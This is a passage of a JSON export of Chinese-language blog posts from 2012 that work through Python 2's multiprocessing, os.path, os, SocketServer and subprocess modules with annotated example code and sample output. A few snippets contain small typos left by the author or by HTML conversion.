multiprocessing.current_process().name\n    print name, 'Starting'\n    time.sleep(3)\n    print name, 'Exiting'</p>\n\n<p>if __name__ == '__main__':\n    service = multiprocessing.Process(name='my_service', target=my_service) #使用自定义的函数名\n    worker_1 = multiprocessing.Process(name='worker 1', target=worker)\n    worker_2 = multiprocessing.Process(target=worker) # use default name  #使用默认的函数名，即Process-3</p>\n\n<p>    worker_1.start()\n    worker_2.start()\n    service.start()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport time\nimport sys</p>\n\n<p>def daemon():\n    p = multiprocessing.current_process()\n    print 'Starting:', p.name, p.pid\n    sys.stdout.flush()\n    time.sleep(2)\n    print 'Exiting :', p.name, p.pid\n    sys.stdout.flush()</p>\n\n<p>def non_daemon():  #默认情况下，主程序将不会退出，直到所有的孩子都已经退出\n    p = multiprocessing.current_process()\n    print 'Starting:', p.name, p.pid\n    sys.stdout.flush()\n    print 'Exiting :', p.name, p.pid\n    sys.stdout.flush()</p>\n\n<p>if __name__ == '__main__':\n    d = multiprocessing.Process(name='daemon', target=daemon)\n    d.daemon = True</p>\n\n<p>    n = multiprocessing.Process(name='non-daemon', target=non_daemon)\n    n.daemon = False   #默认是不是守护进程，以便通过真正轮流守护模式</p>\n\n<p>    d.start()\n    time.sleep(1)\n    n.start()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport time\nimport sys</p>\n\n<p>def daemon():\n    print 'Starting:', multiprocessing.current_process().name\n    time.sleep(2)\n    print 'Exiting :', multiprocessing.current_process().name</p>\n\n<p>def non_daemon():\n    print 'Starting:', multiprocessing.current_process().name\n    print 'Exiting :', multiprocessing.current_process().name</p>\n\n<p>if __name__ == '__main__':\n    d = multiprocessing.Process(name='daemon', target=daemon)\n    d.daemon = True</p>\n\n<p>    n = multiprocessing.Process(name='non-daemon', target=non_daemon)\n    n.daemon = False</p>\n\n<p>    d.start()\n    time.sleep(1)\n    n.start()</p>\n\n<p>    d.join() #会使主调线程堵塞，直到被调用线程运行结束或超时,join函数可以设置超时， 如果进程在超时期限内没有完成就返回 比如join(1)，可以通过d.is_alive()查看进程是否存活\n    n.join()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport time</p>\n\n<p>def slow_worker():\n    print 'Starting worker'\n    time.sleep(0.1)\n    print 'Finished worker'</p>\n\n<p>if __name__ == '__main__':\n    p = multiprocessing.Process(target=slow_worker)\n    print 'BEFORE:', p, p.is_alive()</p>\n\n<p>    p.start()\n    print 'DURING:', p, p.is_alive()</p>\n\n<p>    p.terminate()  #发送结束进程信号\n    print 'TERMINATED:', p, p.is_alive()</p>\n\n<p>    p.join()  #更新状态以反应终止后的状态\n    print 'JOINED:', p, p.is_alive()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport sys\nimport time</p>\n\n<p>def exit_error():\n    sys.exit(1)</p>\n\n<p>def exit_ok():\n    return</p>\n\n<p>def return_value():\n    return 1</p>\n\n<p>def raises():\n    raise RuntimeError('There was an error!')</p>\n\n<p>def terminated():\n    time.sleep(3)</p>\n\n<p>if __name__ == '__main__':\n    jobs = []\n    for f in [exit_error, exit_ok, return_value, raises, terminated]:\n        print 'Starting process for', f.func_name\n        j = multiprocessing.Process(target=f, name=f.func_name)\n        jobs.append(j)\n        j.start()</p>\n\n<p>    jobs[-1].terminate()</p>\n\n<p>    for j in jobs:\n        j.join()\n        print '%s.exitcode = %s' % (j.name, j.exitcode)  #exitcode返回退出的代码，0表示没有错误，&gt;0表示程序有错误，&lt;0表示被code为-1的信号杀死了\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nStarting process for exit_error\nStarting process for exit_ok\nStarting process for return_value\nStarting process for raises\nStarting process for terminated\nProcess raises:\nTraceback (most recent call last):\nexit_error.exitcode = 1\nexit_ok.exitcode = 0\nreturn_value.exitcode = 0\nFile \"/usr/lib/python2.7/multiprocessing/process.py\", line 232, in _bootstrap\nself.run()\nFile \"/usr/lib/python2.7/multiprocessing/process.py\", line 88, in run\nself._target(*self._args, **self._kwargs)\nFile \"test.py\", line 15, in raises\nraise RuntimeError('There was an error!')\nRuntimeError: There was an error!\nraises.exitcode = 1\nterminated.exitcode = -15\n<pre class=\"sh_python\">\nimport multiprocessing</p>\n\n<p>class Worker(multiprocessing.Process):   #最开始的例子也可以使用继承类的方式</p>\n\n<p>    def run(self):\n        print 'In %s' % self.name\n        return</p>\n\n<p>if __name__ == '__main__':\n    jobs = []\n    for i in range(5):\n        p = Worker()\n        jobs.append(p)\n        p.start()\n    for j in jobs:\n        j.join()\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "05"
    }
  },
  {
    "id": 221,
    "title": "关于os.path研究",
    "category": "python模块研究",
    "tags": [
      "os.path"
    ],
    "url": "/archives/guanyuos-pathyanjiu/",
    "content": "<p>前言：os.path子库主要更容易地在跨平台上对文件名和路径进行解析, 创建, 测试和其他操作.</p>\n\n<p><pre class=\"sh_python\">\nimport os.path</p>\n\n<p>for path in [ '/one/two/three','/one/two/three/','/',',']:\n    print '\"%s\" : \"%s\"' % (path, os.path.split(path)) #<tt>split()</tt> 函数将路径切分成两个两部分并返回一个元组, 它的第二个元素是路径的最后一部份, 第一个元素是路径的前面部分.\n    print '\"%s\" : \"%s\"' % (path, os.path.basename(path)) #basename() 返回的值和 <tt>split()</tt> 返回的第二个值相同.\n    print '\"%s\" : \"%s\"' % (path, os.path.dirname(path)) #dirname() 返回的值是和 <tt>split()</tt> 返回的第一个值相同.\n    print '\"%s\" :' % path, os.path.splitext(path) #splitext() 和 <tt>split()</tt> 类似但是分隔路径的扩展名, 而不是目录名.\npaths = ['/one/two/three/four','/one/two/threefold','/one/two/three/',] # 取一个路径列表作为参数, 返回一个单一的字符串表示这些路径公共的前缀. 这个值可能是一个实际上不存在的路径. 路径分割符是被忽略的\nprint os.path.commonprefix(paths)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport os.path\nimport os\nfor parts in [ ('one', 'two', 'three'),('/', 'one', 'two', 'three'),('/one', '/two', '/three'),]:\n    print parts, ':', os.path.join(*parts)  #可以使用 <tt>join()</tt> 将多个路径部分组合成一个单个值\nfor user in [ '', 'dongwm', 'postgres' ]:\n    lookup = '~' + user\n    print lookup, ':', os.path.expanduser(lookup)  # <tt>expanduser()</tt> 可以将波浪线(~)扩展成用户的主目录.\nos.environ['MYVAR'] = 'VALUE'\nprint os.path.expandvars('/path/to/$MYVAR')  #获取出现在路径中的环境变量.\nfor path in [ '.', '..', './one/two/three', '../one/two/three']:\n    print '\"%s\" : \"%s\"' % (path, os.path.abspath(path))  #使用 abspath() 将一个相对路径转换成绝对路径.\n</pre>\n<pre class=\"sh_python\">\nimport os.path\nimport time</p>\n\n<p>print 'File :', __file__\nprint 'Access time :', time.ctime(os.path.getatime(__file__)) #最后一次访问文件或目录的时间\nprint 'Modified time:', time.ctime(os.path.getmtime(__file__)) #最后一次修改文件或目录的时间\nprint 'Change time :', time.ctime(os.path.getctime(__file__)) #最后一次改变文件或目录(改变的是原数据即:属性)的时间\nprint 'Size :', os.path.getsize(__file__)\n</pre>\n<pre class=\"sh_python\">\nfor file in [ __file__, os.path.dirname(__file__), '/', './broken_link']:\n    print 'File :', file\n    print 'Absolute :', os.path.isabs(file)  #判断是否是绝对路径，返回布尔值\n    print 'Is File? :', os.path.isfile(file)#判断是否是文件，返回布尔值\n    print 'Is Dir? :', os.path.isdir(file)  #判断是否是目录，返回布尔值\n    print 'Is Link? :', os.path.islink(file) #判断是否是链接文件，返回布尔值\n    print 'Mountpoint? :', os.path.ismount(file)#判断是否是挂载文件，返回布尔值\n    print 'Exists? :', os.path.exists(file) #判断是否存在，返回布尔值\n    print 'Link Exists?:', os.path.lexists(file) #判断是否符号链接存在，返回布尔值\n    print\ndef visit(arg, dirname, names):\n    print dirname, arg\n    for name in names:\n        subname = os.path.join(dirname, name)\n        if os.path.isdir(subname):\n            print ' %s/' % name\n        else:\n            print ' %s' % name\n    if '.svn' in names:\n        names.remove('.svn')  #假如是.svn 去掉\n    print</p>\n\n<p>os.path.walk('..', visit, '(User data)') #遍历树中的所有目录, 并调用一个你提供的函数, 同时将目录名和目录中包含内容的名字传递给这个函数\n\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "05"
    }
  },
  {
    "id": 222,
    "title": "关于os研究",
    "category": "python模块研究",
    "tags": [
      "os"
    ],
    "url": "/archives/guanyuosyanjiu/",
    "content": "<p>前言：os可谓python模块最常用模块之一了，也称作：操作系统混合接口，包含的大部分函数用于创建和管理活动进程和文件系统(文件和目录)，但是有些函数在windows上无法使用</p>\n\n<p><pre class=\"sh_python\">\nimport os</p>\n\n<p>TEST_GID=501\nTEST_UID=527</p>\n\n<p>def show_user_info():\n     print 'Effective User  :', os.geteuid()\n     print 'Effective Group :', os.getegid()\n     print 'Actual User    :', os.getuid(), os.getlogin()\n     print 'Actual Group  :', os.getgid()\n     print 'Actual Groups   :', os.getgroups()\n     return</p>\n\n<p>print 'BEFORE CHANGE:'\nshow_user_info()\nprint\ntry:\n     os.setegid(TEST_GID)  #改变这个进程的用户和组属性. 需要root权限，否则改不了\nexcept OSError:\n     print 'ERROR: Could not change effective group.  Re-run as root.'\nelse:\n     print 'CHANGED GROUP:'\n     show_user_info()\n     print</p>\n\n<p>try:\n     os.seteuid(TEST_UID)\nexcept OSError:\n     print 'ERROR: Could not change effective user.  Re-run as root.'\nelse:\n     print 'CHANGE USER:'\n     show_user_info()\n     print\nprint 'Initial value:', os.environ.get('TESTVAR', None) #访问在环境中设置的环境变量\nprint 'Child process:'\nos.system('echo $TESTVAR')  #os.system通过一个shell中的子进程执行系统命令，但是现在不推荐这个函数.它可以包含shell语法, 比如通配符或环境变量:</p>\n\n<p>os.environ['TESTVAR'] = 'THIS VALUE WAS CHANGED'</p>\n\n<p>print\nprint 'Changed value:', os.environ['TESTVAR']\nprint 'Child process:'\nos.system('echo $TESTVAR')</p>\n\n<p>del os.environ['TESTVAR']</p>\n\n<p>print\nprint 'Removed value:', os.environ.get('TESTVAR', None)\nprint 'Child process:'\nos.system('echo $TESTVAR')\nprint 'Starting:', os.getcwd()  #类似于执行命令pwd，获取当前目录\nprint os.listdir(os.curdir)  #列出当前目录下所有文件和文件夹</p>\n\n<p>print 'Moving up one:', os.pardir  \nos.chdir(os.pardir) #改变目录到当前目录的上一级目录，想过类似于： cd .. </p>\n\n<p>print 'After move:', os.getcwd()\nprint os.listdir(os.curdir)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport os</p>\n\n<p>print '\\npopen, read:'\npipe_stdout = os.popen('echo \"to stdout\"', 'r')  #os.popen是管道函数\ntry:\n    stdout_value = pipe_stdout.read() #标准输出流\nfinally:\n    pipe_stdout.close()\nprint '\\tstdout:', repr(stdout_value)</p>\n\n<p>print '\\npopen, write:'\npipe_stdin = os.popen('cat -', 'w')\ntry:\n    pipe_stdin.write('\\tstdin: to stdin\\n') #标准输入流\nfinally:\n    pipe_stdin.close()\nprint '\\npopen2:'\npipe_stdin, pipe_stdout = os.popen2('cat -')  #popen2()函数返回一个与子进程标准输入绑定的只写流和一个与子进程标准输出绑定的只读流\ntry:\n    pipe_stdin.write('through stdin to stdout')\nfinally:\n    pipe_stdin.close()</p>\n\n<p>try:\n    stdout_value = pipe_stdout.read()\nfinally:\n    pipe_stdout.close()\nprint '\\tpass through:', repr(stdout_value)\nprint '\\npopen3:'\npipe_stdin, pipe_stdout, pipe_stderr = os.popen3('cat -; echo \";to stderr\" 1&gt;&amp;2') #popen3函数返回一个新进程的3个流stdin、stdout、stderr\ntry:\n    pipe_stdin.write('through stdin to stdout')\nfinally:\n    pipe_stdin.close()\ntry:\n    stdout_value = pipe_stdout.read()\nfinally:\n    pipe_stdout.close()\nprint '\\tpass through:', repr(stdout_value)\ntry:\n    stderr_value = pipe_stderr.read()\nfinally:\n    pipe_stderr.close()\nprint '\\tstderr:', repr(stderr_value)\nprint '\\npopen4:'\npipe_stdin, pipe_stdout_and_stderr = os.popen4('cat -; echo \";to stderr\" 1&gt;&amp;2') # popen4()返回两个流, stdin和stdout/stderr的组合,\n                                                # 这对于命令的结果需要被记录, 但不需要解析是很有用的.\ntry:\n    pipe_stdin.write('through stdin to stdout')\nfinally:\n    pipe_stdin.close()\ntry:\n    stdout_value = pipe_stdout_and_stderr.read()\nfinally:\n    pipe_stdout.close()\nprint '\\tcombined output:', repr(stdout_value)\nprint '\\npopen2, cmd as sequence:'\npipe_stdin, pipe_stdout = os.popen2(['cat', '-']) #popen2()、popen3()、popen4()函数同样接收字符串序列(命令, 加参数)\ntry:\n    pipe_stdin.write('through stdin to stdout')\nfinally:\n    pipe_stdin.close()\ntry:\n    stdout_value = pipe_stdout.read()\nfinally:\n    pipe_stdout.close()\nprint '\\tpass through:', repr(stdout_value)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport os</p>\n\n<p>print 'Testing:', __file__\nprint 'Exists:', os.access(__file__, os.F_OK) #os.access()可以测试一个进程对一个文件是否有可访问权限.os.F_OK测试存在,返回布尔值\nprint 'Readable:', os.access(__file__, os.R_OK) #os.R_OK测试可读,返回布尔值\nprint 'Writable:', os.access(__file__, os.W_OK) #os.W_OK测试可写,返回布尔值\nprint 'Executable:', os.access(__file__, os.X_OK) #os.X_OK测试可读,返回布尔值\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python !$\npython test.py\nTesting: test.py\nExists: True\nReadable: True\nWritable: True\nExecutable: False\n<pre class=\"sh_python\">\nimport os\nimport sys\nimport time</p>\n\n<p>if len(sys.argv) == 1:\n    filename = __file__\nelse:\n    filename = sys.argv[1]</p>\n\n<p>stat_info = os.stat(filename)</p>\n\n<p>print 'os.stat(%s):' % filename\nprint '\\tSize:', stat_info.st_size  #字节数\nprint '\\tPermissions:', oct(stat_info.st_mode) #文件权限\nprint '\\tOwner:', stat_info.st_uid  #文件uid（拥有者）\nprint '\\tDevice:', stat_info.st_dev #文件所在文件设备\nprint '\\tLast modified:', time.ctime(stat_info.st_mtime)  #文件修改时间（最近一次）\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nos.stat(test.py):\nSize: 388\nPermissions: 0100644\nOwner: 1000\nDevice: 2055\nLast modified: Thu Jul  5 11:19:28 2012\n<pre class=\"sh_python\">\nimport os\nimport stat</p>\n\n<p>existing_permissions = stat.S_IMODE(os.stat(__file__).st_mode)  #确定哪些权限已设置使用</p>\n\n<p>if not os.access(__file__, os.X_OK):\n    print 'Adding execute permission'\n    new_permissions = existing_permissions | stat.S_IXUSR #添加权限\nelse:\n    print 'Removing execute permission'\n    new_permissions = existing_permissions ^ stat.S_IXUSR   #去掉权限</p>\n\n<p>os.chmod(__file__, new_permissions)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport sys\nimport tempfile dir_name = 'os_directories_example'</p>\n\n<p>print 'Creating', dir_name\nos.makedirs(dir_name)  #创建文件夹</p>\n\n<p>file_name = os.path.join(dir_name, 'example.txt')\nprint 'Creating', file_name\nf = open(file_name, 'wt')  #添加文件\ntry:\n    f.write('example file')\nfinally:\n    f.close()</p>\n\n<p>print 'Listing', dir_name\nprint os.listdir(dir_name)</p>\n\n<p>print 'Cleaning up'\nos.unlink(file_name)  #相当于删掉文件\nos.rmdir(dir_name)  #删除文件夹\nlink_name = tempfile.mktemp()</p>\n\n<p>print 'Creating link %s-&gt;%s' % (link_name, __file__)\nos.symlink(__file__, link_name)  #创建符号链接 ，类似于ln -s</p>\n\n<p>stat_info = os.lstat(link_name) #链接文件的状态\nprint 'Permissions:', oct(stat_info.st_mode)</p>\n\n<p>print 'Points to:', os.readlink(link_name)  #链接文件源文件\nos.unlink(link_name)\nif len(sys.argv) == 1:\n    root = '/tmp'\nelse:\n    root = sys.argv[1]</p>\n\n<p>for dir_name, sub_dirs, files in os.walk(root):  #os.walk()可以递归遍历一个目录\n    print '\\n', dir_name\n    sub_dirs = [ '%s/' % n for n in sub_dirs ]\n    contents = sub_dirs + files\n    contents.sort()\n    for c in contents:\n        print '\\t%s' % c\n</pre></p>\n\n<p><pre class=\"sh_python\">\npid = os.fork() #创建一个新进程作为当前进程的一个复本,当fork之后, 你结束这两个运行着相同代码的进程. 可以检查返回值来直到你在哪个进程中. \n                #如果它是0, 表示你在子进程中, 如果不是0, 则表示你在父进程中, 它返回的值是其子进程的进程id.</p>\n\n<p>if pid:\n    print 'Child process id:', pid\nelse:\n    print 'I am the child'\n</pre></p>\n\n<p><pre class=\"sh_python\"></p>\n\n<p>import os\nimport signal\nimport time</p>\n\n<p>def signal_usr1(signum, frame):\n    pid = os.getpid()\n    print 'Received USR1 in process %s' % pid\nprint 'Forking...'\nchild_pid = os.fork()\nif child_pid: ## 这个是父进程执行的代码\n    print 'PARENT: Pausing before sending signal...'\n    time.sleep(1)\n    print 'PARENT: Signaling %s' % child_pid\n    os.kill(child_pid, signal.SIGUSR1) #父进程中, 通过 <tt>os.kill()</tt> 发送一个USR1信号之前暂停一段时间. 这短的暂停让子进程有时间去设置信号处理句柄\nelse: #在子进程中, 我们设置信号处理句柄后睡眠一段时间来让父进程有时间去发送信号给我们\n    print 'CHILD: Setting up signal handler'\n    signal.signal(signal.SIGUSR1, signal_usr1)\n    print 'CHILD: Pausing to wait for signal'\n    time.sleep(5)\n</pre></p>\n\n<p>执行分析：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nForking...\nPARENT: Pausing before sending signal...\nCHILD: Setting up signal handler\nCHILD: Pausing to wait for signal\nPARENT: Signaling 1946\nReceived USR1 in process 1946\n<pre class=\"sh_python\">\nchild_pid = os.fork()\nif child_pid:\n    os.waitpid(child_pid, 0) #指示父进程等候一个指定的子进程终止\nelse:\n    os.execlp('ls', 'ls', '-l', '/tmp/') ## 执行多个子进程.有很多 <tt>exec*()</tt> 的变种, 它们依赖于你可能使用的参数, 如, 你是否想要路径和父进程的环境变量都被复制到子进程中\nos.spawnlp(os.P_WAIT, 'ls', 'ls', '-l', '/tmp/') #方便起见, <tt>os.spawn*()</tt> 系列函数将 <tt>fork()</tt> 和 <tt>exec*()</tt> 调用写在一条语句中\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport sys\nimport time</p>\n\n<p>for i in range(3):\n    print 'PARENT: Forking %s' % i\n    worker_pid = os.fork()\n    if not worker_pid:\n        print 'WORKER %s: Starting' % i\n        time.sleep(2 + i)\n        print 'WORKER %s: Finishing' % i\n        sys.exit(i)</p>\n\n<p>for i in range(3):\n    print 'PARENT: Waiting for %s' % i\n    done = os.wait() #多个进程来运行各自的任务, 你希望在开始新的进程之前等待其中一个或多个的结束, 以此来避免服务器的超载.\n                     #返回值是包含进程号和退出状态(一个16位的数字, 它的低字节是一个杀死该进程的信号数字, 它的高字节是退出状态)的一个元组.\n    print 'PARENT:', done\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "05"
    }
  },
  {
    "id": 223,
    "title": "关于SocketServer研究",
    "category": "python模块研究",
    "tags": [
      "SocketServer"
    ],
    "url": "/archives/guanyusocketserveryanjiu/",
    "content": "<p>前言;SocketServer模块是一个用于创建网络服务器的框架. 他提供了处理TCP, UDP, Unix流和Unix数据包的基本类和支持线程和进程服务器</p>\n\n<p><pre class=\"sh_python\">\nimport logging\nimport sys\nimport SocketServer</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n  format='%(name)s: %(message)s',\n)</p>\n\n<p>class EchoRequestHandler(SocketServer.BaseRequestHandler):   #通过启动不同的线程（进程）来实现每个链接一个线程</p>\n\n<p>    def __init__(self, request, client_address, server):\n        self.logger = logging.getLogger('EchoRequestHandler')\n        self.logger.debug('__init__')\n        SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)\n        return</p>\n\n<p>    def setup(self):  #准备一个请求处理者\n        self.logger.debug('setup')\n        return SocketServer.BaseRequestHandler.setup(self)</p>\n\n<p>    def handle(self):  #做实际处理请求的工作. 解析到来的请求, 处理数据并发送一个response.\n        self.logger.debug('handle')\n        data = self.request.recv(1024)\n        self.logger.debug('recv()-&gt;\"%s\"', data)\n        self.request.send(data)\n        return</p>\n\n<p>    def finish(self):  #清除在setup()中创建的所有东西.\n        self.logger.debug('finish')\n        return SocketServer.BaseRequestHandler.finish(self)</p>\n\n<p>class EchoServer(SocketServer.TCPServer):  #使用TCP/IP sockets来通信</p>\n\n<p>    def __init__(self, server_address, handler_class=EchoRequestHandler):  #设置使用的处理类是上面创建的\n        self.logger = logging.getLogger('EchoServer')\n        self.logger.debug('__init__')\n        SocketServer.TCPServer.__init__(self, server_address, handler_class)\n        return</p>\n\n<p>    def server_activate(self): #激活server\n        self.logger.debug('server_activate')\n        SocketServer.TCPServer.server_activate(self)\n        return</p>\n\n<p>    def serve_forever(self): \n        self.logger.debug('waiting for request')\n        self.logger.info('Handling requests, press &lt;Ctrl-C&gt; to quit')\n        while True:   #在一个无穷循环中调用 <tt>handle_request()</tt>，激活后进入这个循环\n            self.handle_request()\n        return</p>\n\n<p>    def handle_request(self):  \n        self.logger.debug('handle_request')\n        return SocketServer.TCPServer.handle_request(self)</p>\n\n<p>    def verify_request(self, request, client_address):  #返回True来处理请求, 或者False表示忽略这个请求. 比如, 你也可以拒绝从一个IP范围来的请求, 假如你想要阻断某些客户端访问服务器.\n        self.logger.debug('verify_request(%s, %s)', request, client_address)\n        return SocketServer.TCPServer.verify_request(self, request, client_address)</p>\n\n<p>    def process_request(self, request, client_address): #它通常是调用finish_request()来完成实际工作. 但它也看创建一个独立的线程或进程, 作为混合类来使用(如下).\n        self.logger.debug('process_request(%s, %s)', request, client_address)\n        return SocketServer.TCPServer.process_request(self, request, client_address)</p>\n\n<p>    def server_close(self):  \n        self.logger.debug('server_close')\n        return SocketServer.TCPServer.server_close(self)</p>\n\n<p>    def finish_request(self, request, client_address): #使用在服务器构造时指定的类来创建一个请求处理实例. 她调用请求处理类的 <tt>handle()</tt> 来处理请求.\n        self.logger.debug('finish_request(%s, %s)', request, client_address)\n        return SocketServer.TCPServer.finish_request(self, request, client_address)</p>\n\n<p>    def close_request(self, request_address):\n        self.logger.debug('close_request(%s)', request_address)\n        return SocketServer.TCPServer.close_request(self, request_address)\nif __name__ == '__main__':\n    import socket\n    import threading</p>\n\n<p>    address = ('localhost', 0) # 让内核自动分配一个端口\n    server = EchoServer(address, EchoRequestHandler)\n    ip, port = server.server_address </p>\n\n<p>    t = threading.Thread(target=server.serve_forever) #将EchoServer放在线程运行，不影响继续操作\n    t.setDaemon(True) # 设置deamon\n    t.start()</p>\n\n<p>    logger = logging.getLogger('client')\n    logger.info('Server on %s:%s', ip, port)</p>\n\n<p>    logger.debug('creating socket')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    logger.debug('connecting to server')\n    s.connect((ip, port))</p>\n\n<p>    message = 'Hello, world'\n    logger.debug('sending data: \"%s\"', message)\n    len_sent = s.send(message)</p>\n\n<p>    logger.debug('waiting for response')\n    response = s.recv(len_sent)\n    logger.debug('response from server: \"%s\"', response)</p>\n\n<p>    logger.debug('closing socket')\n    s.close()\n    logger.debug('done')\n    server.socket.close()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nEchoServer: __init__\nEchoServer: server_activate\nEchoServer: waiting for request\nclient: Server on 127.0.0.1:42902\nEchoServer: Handling requests, press &lt;Ctrl-C&gt; to quit\nclient: creating socket\nEchoServer: handle_request\nclient: connecting to server\nclient: sending data: \"Hello, world\"\nEchoServer: verify_request(&lt;socket._socketobject object at 0x8114ae4&gt;, ('127.0.0.1', 33084))\nclient: waiting for response\nEchoServer: process_request(&lt;socket._socketobject object at 0x8114ae4&gt;, ('127.0.0.1', 33084))\nEchoServer: finish_request(&lt;socket._socketobject object at 0x8114ae4&gt;, ('127.0.0.1', 33084))\nEchoRequestHandler: __init__\nEchoRequestHandler: setup\nEchoRequestHandler: handle\nEchoRequestHandler: recv()-&gt;\"Hello, world\"\nEchoRequestHandler: finish\nclient: response from server: \"Hello, world\"\nEchoServer: close_request(&lt;socket._socketobject object at 0x8114ae4&gt;)\nclient: closing socket\nEchoServer: handle_request\nclient: done\n<pre class=\"sh_python\">\nimport threading\nimport SocketServer</p>\n\n<p>class ThreadedEchoRequestHandler(SocketServer.BaseRequestHandler):</p>\n\n<p>    def handle(self):  #重写handle函数\n        data = self.request.recv(1024)\n        cur_thread = threading.currentThread() # 当要处理一个请求时开始一个新的线程, 并且会在一个新的孩子线程中完成工作\n        response = '%s: %s' % (cur_thread.getName(), data)\n        self.request.send(response)\n        return</p>\n\n<p>class ThreadedEchoServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): 对于线程, 使用ThreadingMixIn:\n    pass</p>\n\n<p>if __name__ == '__main__':\n    import socket\n    import threading</p>\n\n<p>    address = ('localhost', 0) \n    server = ThreadedEchoServer(address, ThreadedEchoRequestHandler)\n    ip, port = server.server_address </p>\n\n<p>    t = threading.Thread(target=server.serve_forever)\n    t.setDaemon(True)\n    t.start()\n    print 'Server loop running in thread:', t.getName()</p>\n\n<p>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, port))</p>\n\n<p>    message = 'Hello, world'\n    print 'Sending : \"%s\"' % message\n    len_sent = s.send(message)</p>\n\n<p>    response = s.recv(1024)\n    print 'Received: \"%s\"' % response</p>\n\n<p>    s.close()\n    server.socket.close()\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>注：使用独立的进程, 可以使用ForkingMixIn:</p>\n\n<p><pre class=\"sh_python\">\nclass ForkingEchoRequestHandler(SocketServer.BaseRequestHandler):</p>\n\n<p>    def handle(self):\n        # Echo the back to the client\n        data = self.request.recv(1024)\n        cur_pid = os.getpid()\n        response = '%s: %s' % (cur_pid, data)\n        self.request.send(response)\n        return</p>\n\n<p>class ForkingEchoServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):\n    pass\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "05"
    }
  },
  {
    "id": 224,
    "title": "关于subprocess研究",
    "category": "python模块研究",
    "tags": [
      "subprocess"
    ],
    "url": "/archives/guanyusubprocessyanjiu/",
    "content": "<p>前言：subprocess启动一个新的进程（子进程）并与其进行通讯的模块，subprocess被用来替换一些老的模块和函数，如：os.system、os.spawn*、os.popen*、popen2.*、commands.*。可见，subprocess是被推荐使用的模块。</p>\n\n<p><pre class=\"sh_python\">\nimport subprocess</p>\n\n<p>subprocess.call(['ls', '-1'], shell=True)  #call类似于<em>os.system()</em>执行外部命令，而且他也支持定义的变量比如echo $HOME'\nsubprocess.check_call(['false'])  #这个false命令会返回一个exitcode不为0的结果，她会被捕捉raise\noutput = subprocess.check_output(['ls', '-1'])  #捕获执行结果输出\nprint 'Have %d bytes in output' % len(output)\noutput = subprocess.check_output(\n    'echo to stdout; echo to stderr 1&gt;&amp;2; exit 1',   #因为重定向了输出，输出流数据不被记录，错误输出流被记录\n    shell=True,\n    )\noutput = subprocess.check_output(\n    'echo to stdout; echo to stderr 1&gt;&amp;2; exit 1',\n    shell=True,\n    stderr=subprocess.STDOUT,   #错误输出也被重定向，只会打印check捕捉到的退出代码不是0的异常\n    )\nprint 'Have %d bytes in output' % len(output)\nprint output\nprint '\\nread:'\nproc = subprocess.Popen(['echo', '\"to stdout\"'],   Popen类似于os.popen，将输出，输入，错误定向到管道 \n                        stdout=subprocess.PIPE,  #将输出流定向到管道\n                        )\nstdout_value = proc.communicate()[0]  #获取数据\nprint '\\tstdout:', repr(stdout_value)\nimport subprocess</p>\n\n<p>print '\\nwrite:'\nproc = subprocess.Popen(['cat', '-'],\n                        stdin=subprocess.PIPE,  #输入流定向到管道\n                        )\nproc.communicate('\\tstdin: to stdin\\n')\nprint '\\npopen2:'</p>\n\n<p>proc = subprocess.Popen(['cat', '-'],\n                        stdin=subprocess.PIPE,  #同时定向输出输入流\n                        stdout=subprocess.PIPE,\n                        )\nstdout_value = proc.communicate('through stdin to stdout')[0]\nprint '\\tpass through:', repr(stdout_value)\nprint '\\npopen3:'\nproc = subprocess.Popen('cat -; echo \"to stderr\" 1&gt;&amp;2',\n                        shell=True,\n                        stdin=subprocess.PIPE,  ##同时定向输出输入错误流\n                        stdout=subprocess.PIPE,\n                        stderr=subprocess.PIPE,\n                        )\nstdout_value, stderr_value = proc.communicate('through stdin to stdout')\nprint '\\tpass through:', repr(stdout_value)\nprint '\\tstderr      :', repr(stderr_value)\nprint '\\npopen4:'\nproc = subprocess.Popen('cat -; echo \"to stderr\" 1&gt;&amp;2',\n                        shell=True,\n                        stdin=subprocess.PIPE,\n                        stdout=subprocess.PIPE,\n                        stderr=subprocess.STDOUT,  #把错误流定向到输出流，那么错误流就是none\n                        )\nstdout_value, stderr_value = proc.communicate('through stdin to stdout\\n')\nprint '\\tcombined output:', repr(stdout_value)\nprint '\\tstderr value   :', repr(stderr_value)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport subprocess</p>\n\n<p>cat = subprocess.Popen(['cat', 'index.rst'], \n                        stdout=subprocess.PIPE,\n                        )</p>\n\n<p>grep = subprocess.Popen(['grep', '.. include::'],\n                        stdin=cat.stdout,\n                        stdout=subprocess.PIPE,\n                        )</p>\n\n<p>cut = 